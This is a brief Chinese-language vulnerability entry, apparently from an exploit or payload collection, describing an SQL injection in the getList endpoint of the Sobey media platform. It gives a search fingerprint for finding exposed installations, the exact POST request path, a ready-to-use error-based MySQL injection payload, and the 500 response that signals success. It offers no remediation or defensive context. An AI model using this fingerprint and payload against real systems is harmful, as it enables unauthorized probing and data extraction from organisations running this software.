# 索贝融媒体系统getList存在SQL注入漏洞

索贝融媒体系统 ｜ SQL注入 ｜ —
- **指纹**：`app="SOBEY-融媒体"`
- **请求**：`POST /sobey-mchEditor/mch/Articlelist/queryByCode/../getList HTTP/1.1`

**Payload**
```
catalogid=1 AND GTID_SUBSET(CONCAT(0x71767a7871,(SELECT (ELT(9852=9852,1))),0x71767a7671),9852)
```
- **响应特征**：500